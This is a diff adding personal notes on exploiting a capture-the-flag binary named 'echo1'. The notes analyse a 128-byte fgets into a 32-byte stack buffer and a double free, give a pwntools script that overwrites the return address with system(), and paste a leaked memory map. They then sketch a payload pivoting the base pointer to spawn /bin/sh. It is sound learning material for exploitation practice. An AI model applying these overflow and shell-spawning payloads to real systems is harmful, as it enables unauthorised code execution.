@@ -1,0 +1,154 @@
+gets name (pads to 24 bytes if less, no more than 32 bytes, if more CAN OVERFLOW)
+copies name from v6 into o/v3 (buffer of maximum size of 0x28/44 bytes)
+echo1,2,3 get put in the "array", 8 bytes each of func (echo1 + empty 8 bytes + echo2 + echo3)
+while letter of echo type is not 121 in value:
+1-3: perform matching operation (only 1 works), call matching function from func array
+4: exit
+>4/letters: invalid menu, if string written as input is by char it will cause len(str) iterations
+to occur
+letter of 'y' (121/0x79) should stop the outer for loop
+both echo2 and echo3 print "not supported" and do nothing as can be seen by running echo1
+
+echo1():
+s = local 32 bytes buffer (probably string)
+fgets(s, 128)
+puts(s)
+return 0
+
+#while fgets does enforce the provided size (in this case - 128 bytes), the size of 128 bytes is 96 bytes bigger than the actual size of the buffer, buffer overflow can easily occur
+
+another possibly vulnurable area in this binary is in cleanup() that occurs only when 4 is provided(exit):
+this function frees the o buffer that holds the name string, and without any other checks will cause a double free vulnurability
+
+summary of attack vectors:
+1) buffer overflow in input for echo1, first 32 bytes are expected and other 96 bytes are not expected and will overflow the buffer
+2) cleanup() when 4 (exit) is provided will free the name buffer(o) without any additional checks, double free vulnurability
+
+i tried to free o twice by declining the exit prompt to see exactly what i can get from freeing the name twice:
+# NAME BUFFER (O) CANNOT BE INPUTTED WITH MORE THAN 25 BYTES (24+NULLTERM), ELSE WILL SEGFAULT
+using a buffer of name = abcdefghijklmnopqrstuvwxy and a buffer of 
+echo value (in stack) = abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ:
+stack control is probably unlimited, but cannot know where the addresses are located,
+addresses are not constant and do not have any leak
+return address of echo1 overwritten by buffer: OPQRSTUV (in x64, in x86 - OPQR)
+rsp points to on the stack:
+echo string
+ --
+0x0 (can prob be overwritten)
+ --
+0x1 (can prob be overwritten)
+# after leave rsp points to "OPQRST..." part
+
+can also control RBPs value: overwritten by "GHIJKLMN", continuation is pointed to by rsp
+rax points to "abcdef..." at the start of echo1
+
+ATTACK VECTOR - if i know the address of system() in libc, i can organize the buffer on the 
+stack so the parameter for the string for system() will be "system /bin/sh" and the return
+address for echo1 will be the address of system()
+
+constant address of system() - 0x00007ffff7e16920 (little endian = \x20\x69\xe1\xf7\xff\x7f)
+when replacing the return address area with a pwntools script,
+buffer = b'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN' + b'\x20\x69\xe1\xf7\xff\x7f\x00\x00' +
+b'OPQRSTUVWXYZ1234567890-=_+':
+from pwn import *
+
+s = gdb.debug("./echo1", "break echo1")
+print(s.recv())  # name input message
+s.send(b'abcdefghijklmnopqrstuvwxy')
+print(s.recv())  # menu message
+s.send(b'\x31\x00')
+print(s.recv())  # greetings output
+buffer = b'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN' + b'\x20\x69\xe1\xf7\xff\x7f\x00\x00' + b'OPQRSTUVWXYZ1234567890-=_+'
+s.send(buffer)
+s.interactive()
+
+
+DOES NOT WORK - ADDRESS OF LIBC ISNT CONSTANT
+because how i currently checked in libc was not constant, i tried finding more info about the target:
+after double freeing the o memory buffer, vmmap dump was printed to me (BIG MISTAKE):
+*** Error in `/home/echo1/echo1': double free or corruption (fasttop): 0x0000000000ed4010 ***
+======= Backtrace: =========
+/lib/x86_64-linux-gnu/libc.so.6(+0x777f5)[0x7fc50b4297f5]
+/lib/x86_64-linux-gnu/libc.so.6(+0x8038a)[0x7fc50b43238a]
+/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fc50b43658c]
+/home/echo1/echo1[0x4008af]
+/home/echo1/echo1[0x400a25]
+/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fc50b3d2840]
+/home/echo1/echo1[0x4006d9]
+======= Memory map: ========
+00400000-00401000 r-xp 00000000 103:00 23593680                          /home/echo1/echo1
+00601000-00602000 r-xp 00001000 103:00 23593680                          /home/echo1/echo1
+00602000-00603000 rwxp 00002000 103:00 23593680                          /home/echo1/echo1
+00ed4000-00ef5000 rwxp 00000000 00:00 0                                  [heap]
+7fc504000000-7fc504021000 rwxp 00000000 00:00 0
+7fc504021000-7fc508000000 ---p 00000000 00:00 0
+7fc50b19c000-7fc50b1b2000 r-xp 00000000 103:00 57016847                  /lib/x86_64-linux-gnu/libgcc_s.so.1
+7fc50b1b2000-7fc50b3b1000 ---p 00016000 103:00 57016847                  /lib/x86_64-linux-gnu/libgcc_s.so.1
+7fc50b3b1000-7fc50b3b2000 rwxp 00015000 103:00 57016847                  /lib/x86_64-linux-gnu/libgcc_s.so.1
+7fc50b3b2000-7fc50b572000 r-xp 00000000 103:00 57017299                  /lib/x86_64-linux-gnu/libc-2.23.so
+7fc50b572000-7fc50b772000 ---p 001c0000 103:00 57017299                  /lib/x86_64-linux-gnu/libc-2.23.so
+7fc50b772000-7fc50b776000 r-xp 001c0000 103:00 57017299                  /lib/x86_64-linux-gnu/libc-2.23.so
+7fc50b776000-7fc50b778000 rwxp 001c4000 103:00 57017299                  /lib/x86_64-linux-gnu/libc-2.23.so
+7fc50b778000-7fc50b77c000 rwxp 00000000 00:00 0
+7fc50b77c000-7fc50b7a2000 r-xp 00000000 103:00 57017291                  /lib/x86_64-linux-gnu/ld-2.23.so
+7fc50b98f000-7fc50b992000 rwxp 00000000 00:00 0
+7fc50b9a0000-7fc50b9a1000 rwxp 00000000 00:00 0
+7fc50b9a1000-7fc50b9a2000 r-xp 00025000 103:00 57017291                  /lib/x86_64-linux-gnu/ld-2.23.so
+7fc50b9a2000-7fc50b9a3000 rwxp 00026000 103:00 57017291                  /lib/x86_64-linux-gnu/ld-2.23.so
+7fc50b9a3000-7fc50b9a4000 rwxp 00000000 00:00 0
+7fff60203000-7fff60224000 rwxp 00000000 00:00 0                          [stack]
+7fff603a0000-7fff603a3000 r--p 00000000 00:00 0                          [vvar]
+7fff603a3000-7fff603a5000 r-xp 00000000 00:00 0                          [vdso]
+ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
+
+this means 2 important things:
+1) echo1 runs on a 64 bit machine (libc's path and the dump addresses)
+2) libc which is specified in the first lines after "backrack" - /lib/x86_64-linux-gnu/libc.so.6(+0x777f5)[0x7f2adffc87f5] is located in 0x7f2adffc87f5 - 0x777f5 = 0x00007F2ADFF51000
+
+with the information read from https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc:
+was going to use base address for exploit, but there isnt a constant address of libc so the base address is not constant also
+
+
+
+NEW IDEA WITH IDA:
+printf is one of the imported functions  from libc, therefore it has a CONSTANT address in .text segment - 0x6020C0
+using a format string vulnurability, i could pass the string /bin/sh as a parameter to printf (controlling the stack entirely)
+format string vulnurability - executes the format string provided to printf
+return address will be 0x6020C0 and will be continued in stack with the string to execute
+ALSO WILL NOT WORK - string will not run straight, can only be used to leak addresses and its
+not possible here, the string is the 2nd parameter in each printf
+
+no one of the libc imports can be used for code execution, so jumping to them will not help
+i also compared 2 double free vmmap dumps to try to find some constant values:
+/home/echo1/echo1[0x4006d9]
+/home/echo1/echo1[0x4008af]
+/home/echo1/echo1[0x400a25]
+00400000-00401000 r-xp 00000000 103:00 23593680                          /home/echo1/echo1  # .text section, no useable gadgets
+00601000-00602000 r-xp 00001000 103:00 23593680                          /home/echo1/echo1  # not useful, filled with add BYTE PTR [rax],al
+00602000-00603000 rwxp 00002000 103:00 23593680                          /home/echo1/echo1  # GOT of IMPORTED libc functions + like last time
+======= backtrace: =========
+======= memory map: ========
+ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]  # might be useful
+
+
+NEW ATTACK VECTOR VERYYYYYY POSSIBLE:
+buffer:
+- padding in start (abcdefghijklmnopqrstuvwxyzABCDEF)
+- instead of GHIJKLMN, replace bp with the address in the writing section to write function + 20,
+ so later there will be written the input
+- return address modified to 0x0000000000400837
+- another return address that will be the value of the function in the writeable section
+
+after looking at the section, i decided to write the function to address 0x60214e, so the value
+in rbp should be 0x60214e + 0x20 = 0x60216e
+
+in conclusion:
+1) buffer should be -
+buffer = b'abcdefghijklmnopqrstuvwxyzABCDEF' + p64(0x60216e) + p64(0x400837) + p64(0x60214e)
+2) first input in echo should be the buffer, second should be the disassembly of function to call
+
+function to call psuedocode:
+void openshell(){
+	# DISASSEMBLE REGULAR BINARY CALLING TO system("/bin/sh") TO COPY DISASSEMBLY OF FUNCTION
+}
+# CAN ALSO USE malloc() TO STORE "/bin/sh" IF RBP DOES PROBLEMS
